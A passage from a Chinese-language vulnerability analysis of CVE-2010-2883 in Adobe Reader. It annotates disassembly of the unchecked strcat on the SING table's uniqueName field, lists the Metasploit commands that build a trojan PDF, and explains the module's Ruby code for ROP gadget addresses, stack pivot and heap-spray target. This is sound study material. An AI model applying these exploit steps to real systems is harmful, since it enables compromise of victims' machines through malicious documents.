class="line">.text:0803DD3A     xor     esi, esi</span><br><span class="line">.text:0803DD3C     cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DD40     mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DD43     jz      loc_803DF00</span><br><span class="line">.text:0803DD49     mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD4C     mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DD4F     cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DD53     mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DD57     jnz     loc_803DEA9</span><br><span class="line">.text:0803DD5D     push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DD62     push    edi             ; int</span><br><span class="line">.text:0803DD63     lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DD66     mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DD6A     call    sub_80217D7</span><br><span class="line">.text:0803DD6F     cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD72     jnz     short loc_803DDDD</span><br><span class="line">.text:0803DD74     push    offset aSing            ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79     push    edi                     ; 类对象指针(0x0012E718),第一个变量为 dword_823A850 加 1 之前的值。</span><br><span class="line">.text:0803DD7A     lea     ecx, [ebp+108h+var_12C] ; ecx为字体对象,thiscall,ecx 传参</span><br><span class="line">.text:0803DD7D     call    sub_8021B06             ; 解析字体对象,处理 SING 表</span><br><span class="line">.text:0803DD82     mov     eax, [ebp+108h+var_12C] ; eax 指向 SING 表数据</span><br><span class="line">.text:0803DD85     cmp     eax, esi                ; 判断是否为空</span><br><span class="line">.text:0803DD87     mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B     jz      short loc_803DDC4       ; 这里不跳转</span><br><span class="line">.text:0803DD8D     mov     ecx, [eax]              ; 字体资源版本号0.1,构造样本时小端写入,这里读出就变成了ecx=0x00010000,使其可以顺利执行到 strcat</span><br><span class="line">.text:0803DD8F     and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95     jz      short loc_803DD9F       ; 这里跳转</span><br><span class="line">.text:0803DD97     cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D     jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                ; CODE XREF: sub_803DCF9+9C↑j</span><br><span class="line">.text:0803DD9F     add     eax, 10h                       ; 相对 SING 表入口偏移 0x10 处找到 uniqueName</span><br><span class="line">.text:0803DDA2     push    eax                            ; char *,strcat 源地址入栈，也就是 uniqueName 起始地址</span><br><span class="line">.text:0803DDA3     lea     eax, [ebp+108h+uniqueName_buf] ; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span><br><span class="line">.text:0803DDA6     push    eax                            ; char *,strcat 目的地址入栈</span><br><span class="line">.text:0803DDA7     mov     [ebp+108h+uniqueName_buf], 0   ; 将目标字符串赋值为NULL,空字符串</span><br><span class="line">.text:0803DDAB     call    strcat                         ; 危险函数 strcat,罪魁祸首</span><br></pre></td></tr></table></figure></div>

<p>反编译后得到</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sub_80217D7(v20,a1,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v20[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">sub_8021B06(v18,a1,<span class="string">&quot;SING&quot;</span>);</span><br><span class="line">v6 = v18;</span><br><span class="line">LOBYTE(v22) = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> ( v18 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> !(<span class="type">unsigned</span> __int16)*(_DWORD *)v18 || (<span class="type">unsigned</span> __int16)*(_DWORD *)v18 == <span class="number">256</span></span><br><span class="line">    &#123;</span><br><span class="line">        Destination[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(Destination, (<span class="type">const</span> <span class="type">char</span> *)(v18 + <span class="number">0x10</span>));</span><br><span class="line">        sub_8001243(Destination);</span><br><span class="line">        v6 = v18;</span><br><span class="line">    &#125;</span><br><span class="line">    v21 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它首先会读取 SING 表，之后将 SING 表中 0x10 偏移处(即 UniqueName 字段)通过调用 strcat 函数直接拼接到 Destination 中，而 strcat 函数会将参数 src 字符串复制到参数 dest 所指的字符串尾部，src 字符串的拷贝从第一个字符开始，直到遇到 “\x00” 时结束。这一函数调用过程没有检验拼接的字符串的长度，即未考虑拼接后的字符串超度是否会超出 dest 字符串长度，故存在栈溢出漏洞，攻击者可通过在 TTF 文件的 SING 表的 uniqueName 字段处（0x10 偏移位置）填入任意长度的字符串实施栈溢出攻击</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用 MSF 搜索该漏洞的 exp</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 &gt; search cve-2010-2883</span><br></pre></td></tr></table></figure></div>

<p>搜索结果</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/fileformat/adobe_cooltype_sing</span><br></pre></td></tr></table></figure></div>

<p>调用该模块并查看模块详情</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; info</span><br></pre></td></tr></table></figure></div>

<p>模块详情信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">       Name: Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">     Module: exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch:</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Great</span><br><span class="line">  Disclosed: 2010-09-07</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Unknown</span><br><span class="line">  sn0wfl0w</span><br><span class="line">  jduck &lt;jduck@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">      Id  Name</span><br><span class="line">      --  ----</span><br><span class="line">  =&gt;  0   Automatic</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  FILENAME  msf.pdf          yes       The file name.</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 1000</span><br><span class="line">  Avoid: 1 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a vulnerability in the Smart INdependent Glyplets (SING) table</span><br><span class="line">  handling within versions 8.2.4 and 9.3.4 of Adobe Reader. Prior versions are</span><br><span class="line">  assumed to be vulnerable as well.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2010-2883</span><br><span class="line">  OSVDB (67849)</span><br><span class="line">  http://contagiodump.blogspot.com/2010/09/cve-david-leadbetters-one-point-lesson.html</span><br><span class="line">  http://www.adobe.com/support/security/advisories/apsa10-02.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info -d command.</span><br></pre></td></tr></table></figure></div>

<p>使用该模块生成木马 PDF 文件</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6  exploit(adobe_cooltype_sing) &gt; <span class="built_in">set</span> FILENAME Crash.pdf</span><br><span class="line">msf6  exploit(adobe_cooltype_sing) &gt; <span class="built_in">set</span> payload windows/exec</span><br><span class="line">msf6  exploit(adobe_cooltype_sing) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">msf6  exploit(adobe_cooltype_sing) &gt; exploit</span><br></pre></td></tr></table></figure></div>

<h2 id="Exploit-分析"><a href="#Exploit-分析" class="headerlink" title="Exploit 分析"></a>Exploit 分析</h2><h3 id="Exploit-代码概览"><a href="#Exploit-代码概览" class="headerlink" title="Exploit 代码概览"></a>Exploit 代码概览</h3><p>该模块的 exp 位于</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb</span><br></pre></td></tr></table></figure></div>

<p>让我们来看看这个 exp 是如何进行漏洞利用的</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;zlib&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Metasploit3</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">    <span class="title class_">Rank</span> = <span class="title class_">GreatRanking</span> <span class="comment"># aslr+dep bypass, js heap spray, rop, stack bof</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="title class_">Msf::Exploit::FILEFORMAT</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 初始化函数，注明了 exp 的模块信息</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">        <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">            <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&#x27;Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;...&#125;</span>,</span><br><span class="line">            <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">            <span class="string">&#x27;Author&#x27;</span>         =&gt; ...,</span><br><span class="line">            <span class="string">&#x27;Version&#x27;</span>        =&gt; <span class="string">&#x27;$Revision: 10477 $&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;References&#x27;</span>     =&gt; ...,</span><br><span class="line">            <span class="string">&#x27;DefaultOptions&#x27;</span> =&gt; ...,</span><br><span class="line">            <span class="string">&#x27;Payload&#x27;</span>        =&gt; ...,</span><br><span class="line">            <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Targets&#x27;</span>        =&gt; ...,</span><br><span class="line">            <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;Sep 07 2010&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        register_options(...)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 漏洞利用的入口函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">        ttf_data = make_ttf()</span><br><span class="line">        js_data = make_js(payload.encoded)</span><br><span class="line">        pdf = make_pdf(ttf_data, js_data)</span><br><span class="line">        print_status(<span class="string">&quot;Creating &#x27;<span class="subst">#&#123;datastore[<span class="string">&#x27;FILENAME&#x27;</span>]&#125;</span>&#x27; file...&quot;</span>)</span><br><span class="line">        file_create(pdf)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 构造 TTF 文件</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_ttf</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 构造 JS 文件</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_js</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 随机生成指定长度非 ASCII 码字符序列</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">RandomNonASCIIString</span>(<span class="params">count</span>)</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 为木马 PDF 文件生成对象定义的起始部分</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ioDef</span>(<span class="params">id</span>)</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 为木马 PDF 文件生成对象引用</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ioRef</span>(<span class="params">id</span>)</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 随机替换大写字母为 16 进制表示以混淆字符串</span></span><br><span class="line">    <span class="comment">#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">nObfu</span>(<span class="params">str</span>)</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 将字符串编码为 16 进制并用随机数量的空格分隔</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ASCIIHexWhitespaceEncode</span>(<span class="params">str</span>)</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 生成木马 PDF 文件</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_pdf</span>(<span class="params">ttf, js</span>)</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>

<p>通过审计 exploit 函数，我们能够很快地理解这个 exp 工作的大体流程是生成恶意的 ttf 与 js 文件，把它们封装到木马 pdf 文件中并导出 pdf  到本地。忽略制作 pdf 文件与增加 payload 随机性进行混淆的相关函数，exp 进行漏洞利用的核心代码显然位于 make_ttf 与 make_js 两个函数中。由于栈溢出是由 ttf 文件中的中的 payload 触发的，因此我们先从 make_ttf 函数开始审计</p>
<h3 id="make-ttf-函数"><a href="#make-ttf-函数" class="headerlink" title="make_ttf 函数"></a>make_ttf 函数</h3><div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_ttf</span></span><br><span class="line">    ttf_data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># load the static ttf file</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* Exp 使用的基础文件即下方原注释所标注的 ttf 文件，exp 只需要对基础文件进行修改注入 payload 即可</span></span><br><span class="line">    <span class="comment"># <span class="doctag">NOTE:</span> The 0day used Vera.ttf (785d2fd45984c6548763ae6702d83e20)</span></span><br><span class="line">    path = <span class="title class_">File</span>.join( <span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Config</span>.install_root, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;exploits&quot;</span>, <span class="string">&quot;cve-2010-2883.ttf&quot;</span> )</span><br><span class="line">    fd = <span class="title class_">File</span>.open( path, <span class="string">&quot;rb&quot;</span> )</span><br><span class="line">    ttf_data = fd.read(fd.stat.size)</span><br><span class="line">    fd.close</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build the SING table</span></span><br><span class="line">    <span class="comment">#* 初始化 sing 字符串</span></span><br><span class="line">    sing = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#* 生成 SING 表 uniqueName 字段前的八个字段的值</span></span><br><span class="line">    sing &lt;&lt; [</span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>,   <span class="comment"># tableVersionMajor, tableVersionMinor (0.1)</span></span><br><span class="line">        <span class="number">0xe01</span>,  <span class="comment"># glyphletVersion</span></span><br><span class="line">        <span class="number">0x100</span>,  <span class="comment"># embeddingInfo</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># mainGID</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># unitsPerEm</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># vertAdvance</span></span><br><span class="line">        <span class="number">0x3a00</span>  <span class="comment"># vertOrigin</span></span><br><span class="line">    ].pack(<span class="string">&#x27;vvvvvvvv&#x27;</span>)</span><br><span class="line">    <span class="comment"># uniqueName</span></span><br><span class="line">    <span class="comment"># &quot;The uniqueName string must be a string of at most 27 7-bit ASCII characters&quot;</span></span><br><span class="line">    <span class="comment">#* 生成长度为 0x254 - sing 字符串长度的随机字符串用于增加 payload 随机性</span></span><br><span class="line">    <span class="comment">#* 为方便动态分析时定位 payload 可改为</span></span><br><span class="line">    <span class="comment">#* sing &lt;&lt; &quot;A&quot; * (0x254 - sing.length)</span></span><br><span class="line">    sing &lt;&lt; rand_text(<span class="number">0x254</span> - sing.length)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0xffffffff gets written here @ 0x7001400 (in BIB.dll)</span></span><br><span class="line">    sing[<span class="number">0x140</span>, <span class="number">4</span>] = [<span class="number">0x4a8a08e2</span> - <span class="number">0x1c</span>].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes our new EIP (puts esp to stack buffer)</span></span><br><span class="line">    ret = <span class="number">0x4a80cb38</span> <span class="comment"># add ebp, 0x794 / leave / ret</span></span><br><span class="line">    sing[<span class="number">0x208</span>, <span class="number">4</span>] = [ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes the new eip after the first return</span></span><br><span class="line">    ret = <span class="number">0x4a82a714</span></span><br><span class="line">    sing[<span class="number">0x18</span>, <span class="number">4</span>] = [ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes the new esp after the first return</span></span><br><span class="line">    esp = <span class="number">0x0c0c0c0c</span></span><br><span class="line">    sing[<span class="number">0x1c</span>, <span class="number">4</span>] = [esp].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Without the following, sub_801ba57 returns 0.</span></span><br><span class="line">    sing[<span class="number">0x24c</span>, <span class="number">4</span>] = [<span class="number">0x6c</span>].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 将 payload 插入到基础文件的指定位置</span></span><br><span class="line">    ttf_data[<span class="number">0xec</span>, <span class="number">4</span>] = <span class="string">&quot;SING&quot;</span></span><br><span class="line">    ttf_data[<span class="number">0x11c</span>, sing.length] = sing</span><br><span class="line"></span><br><span class="line">    ttf_data</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>

<p>查看基础文件的 0xec 与 0x11c 处，发现这两处其实是基础文件的 name 表。make_ttf 函数的实际工作流程就是把基础文件的 NAME 表 tag 改为了 SING，并用包含了 Payload 的 sing 字符串的内容替换了基础文件的 NAME 表内容。查看导出的 TTF 文件能够发现该文件中不存在 NAME 表，与上述结论相符合。接下来让我们仔细审计 uniqueName 字段中填入的 payload</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0xffffffff gets written here @ 0x7001400 (in BIB.dll)</span></span><br><span class="line">sing[<span class="number">0x140</span>, <span class="number">4</span>] = [<span class="number">0x4a8a08e2</span> - <span class="number">0x1c</span>].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#* 第一个 ROP Gadget 位于 icucnv36.dll 中的 0x4A80CB38 处</span></span><br><span class="line"><span class="comment">#* gadget 内容是</span></span><br><span class="line"><span class="comment">#* add ebp, 0x794 ;此时 ebp 的值会被调整到 strcat 函数调用后的栈区</span></span><br><span class="line"><span class="comment">#* leave</span></span><br><span class="line"><span class="comment">#* ret ; 执行第二条 gadget</span></span><br><span class="line"><span class="comment"># This becomes our new EIP (puts esp to stack buffer)</span></span><br><span class="line">ret = <span class="number">0x4a80cb38</span> <span class="comment"># add ebp, 0x794 / leave / ret</span></span><br><span class="line">sing[<span class="number">0x208</span>, <span class="number">4</span>] = [ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#* 第二个 ROP Gadget 位于 icucnv36.dll 中的 0x4A82A714 处</span></span><br><span class="line"><span class="comment">#* gadget 内容为</span></span><br><span class="line"><span class="comment">#* pop esp ; 使下方 ruby 代码填入的值成为 esp</span></span><br><span class="line"><span class="comment">#* ret</span></span><br><span class="line"><span class="comment"># This becomes the new eip after the first return</span></span><br><span class="line">ret = <span class="number">0x4a82a714</span></span><br><span class="line">sing[<span class="number">0x18</span>, <span class="number">4</span>] = [ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This becomes the new esp after the first return</span></span><br><span class="line">esp = <span class="number">0x0c0c0c0c</span></span><br><span class="line">sing[<span class="number">0x1c</span>, <span class="number">4</span>] = [esp].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#* 参考链接 2010.09.09 - VUPEN 的文章给出了这个数据的作用</span></span><br><span class="line"><span class="comment"># Without the following, sub_801ba57 returns 0.</span></span><br><span class="line">sing[<span class="number">0x24c</span>, <span class="number">4</span>] = [<span class="number">0x6c</span>].pack(<span class="string">&#x27;V&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>以上代码设置了一条 ROP 链，用于劫持执行流到 Heap Spray 的用于绕过 DEP 的 payload 处，如下图所示（图来自 <a href="#reference">Sp4n9x 的博客</a>）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Vulnerability%20Investigation/rop.png"
                      alt="ROP Flow"
                ></p>
<blockquote>
<p>其中的 ROP Gadget 选择了 icucnv36.dll 中的指令，选择这两处地址中的指令的原因在于，如果打开 icucnv36.dll，会发现其 IMAGE_OPTIONAL_HEADER 中的 IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 的值为 0，也就是说这个 dll 库没有开启 ASLR。事实上，在 Adobe Reader 的各个版本上，这个库应该都基于 Adobe 的某种需要而始终没有开启 ASLR。这使得该 exp 对受影响的各版本 Adobe Reader 都能够稳定且兼容地进行漏洞利用</p>
</blockquote>
<h3 id="make-js-函数"><a href="#make-js-函数" class="headerlink" title="make_js 函数"></a>make_js 函数</h3><p>既然 ttf 文件中的 payload 是用来跳转到真正的执行 shellcode 的 payload 上的，后者存在的位置也就只能是在 make_js 函数里了。事实上，在审计 exploit ruby 代码时就能够非常容易发现 make_js 函数里存放的大量 payload。接下来审计 make_js 函数</p>
